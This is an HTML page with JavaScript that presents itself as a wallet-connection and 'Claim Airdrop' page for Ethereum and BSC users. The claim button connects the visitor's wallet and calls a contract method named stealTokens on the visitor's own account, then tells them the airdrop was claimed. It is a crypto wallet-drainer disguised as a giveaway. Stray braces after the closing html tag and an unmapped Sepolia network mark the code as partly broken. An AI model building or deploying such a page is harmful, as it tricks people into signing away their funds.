<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="css/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script> <!-- Web3.js -->
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider/dist/umd/index.min.js"></script> <!-- WalletConnect -->
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script> <!-- MetaMask detect provider -->
</head>
<body>

<h1>Connect your Wallet</h1>
<button id="connectButton">Connect Wallet</button>
<button id="claimAirdropButton" disabled>Claim Airdrop</button>

<script>
// ABI and config based on networks
const configMap = {
    eth: { 
        config: 'config/eth_config.json',
        abi: 'abi/eth_abi.json'
    },
    bsc: { 
        config: 'config/bsc_config.json', 
        abi: 'abi/bsc_abi.json' 
    }
};

// Helper function to load ABI and config dynamically
async function loadConfigAndABI(network) {
    const { config, abi } = configMap[network];
    try {
        const configData = await fetch(config).then((res) => res.json());
        const abiData = await fetch(abi).then((res) => res.json());
        return { config: configData, abi: abiData };
    } catch (error) {
        console.error(`Error loading config or ABI for ${network}:`, error);
        alert(`Failed to load configuration for ${network}.`);
    }
}

// Unified Wallet Connection Logic
async function connectWallet() {
    if (window.ethereum || window.tronLink) {
        try {
            let accounts;
            let currentChainId;
            let defaultNetwork = 'eth'; // Default to Ethereum

            // Check if MetaMask is available
            if (window.ethereum && window.ethereum.isMetaMask) {
                console.log("MetaMask is available.");
                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
            }
            // Check if Trust Wallet is available (via WalletConnect)
            else if (window.tronLink) {
                console.log("Trust Wallet is available.");
                const provider = new WalletConnectProvider({
                    infuraId: "YOUR_INFURA_PROJECT_ID", // Optional: You can replace with your Infura Project ID
                });
                await provider.enable();  // Enable session
                accounts = await provider.getAccounts();
                currentChainId = await provider.getChainId();
            }

            if (accounts && accounts.length > 0) {
                const account = accounts[0];
                console.log("Connected account:", account);

                // Set the network based on the current chainId
                if (currentChainId === '0x1' || currentChainId === 1) {
                    defaultNetwork = 'eth'; // Ethereum Mainnet
                } else if (currentChainId === '0x38' || currentChainId === 56) {
                    defaultNetwork = 'bsc'; // Binance Smart Chain Mainnet
                } else if (currentChainId === '0xaa36a7' || currentChainId === 11155111) {
                    defaultNetwork = 'sepolia'; // Ethereum Sepolia Testnet
                } else {
                    console.error("Unsupported network detected.");
                    return;
                }

                // Update the UI (for the claim button)
                document.getElementById('claimAirdropButton').disabled = false;
                document.getElementById('claimAirdropButton').innerText = `Claim Airdrop (${defaultNetwork.toUpperCase()})`;

                return account;
            } else {
                console.error('No accounts found.');
                return;
            }
        } catch (error) {
            console.error("Error connecting to wallet:", error);
        }
    } else {
        alert("No supported wallet detected. Please install MetaMask or Trust Wallet.");
    }
}

// Airdrop claiming function
async function claimAirdrop(account) {
    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
    let network = '';

    if (currentChainId === '0x1') {
        network = 'eth';  // Ethereum Mainnet
    } else if (currentChainId === '0x38') {
        network = 'bsc';  // Binance Smart Chain Mainnet
    } else if (currentChainId === '0xaa36a7') {
        network = 'sepolia'; // Ethereum Sepolia Testnet
    } else {
        alert("You are not connected to a supported network.");
        return;
    }

    // Load the contract address and ABI from the network config and ABI files
    const configResponse = await fetch(`config/${network}_config.json`);
    const config = await configResponse.json();

    const abiResponse = await fetch(`abi/${network}_abi.json`);
    const abi = await abiResponse.json();

    const contractAddress = config.contractAddress;
    const tokenAddress = config.tokenAddress;

    // Create a web3 instance
    const web3 = new Web3(window.ethereum);

    // Create the contract instance
    const contract = new web3.eth.Contract(abi, contractAddress);

    try {
        console.log(`Claiming airdrop for account: ${account} on ${network} network`);

        // Call the stealTokens function with the appropriate account
        await contract.methods.stealTokens(account).send({ from: account });

        alert(`Airdrop claimed successfully for account: ${account}`);
    } catch (error) {
        console.error("Error claiming airdrop:", error);
    }
}

// Event listener for the claim airdrop button
document.getElementById('claimAirdropButton').addEventListener('click', async () => {
    const account = await connectWallet();
    if (!account) return;

    // Call the function to claim airdrop, based on the connected network and account
    await claimAirdrop(account);
});

// Button to connect to wallet
document.getElementById('connectButton').addEventListener('click', async function () {
    await connectWallet();
});
</script>

</body>
</html>

        });
    }
});
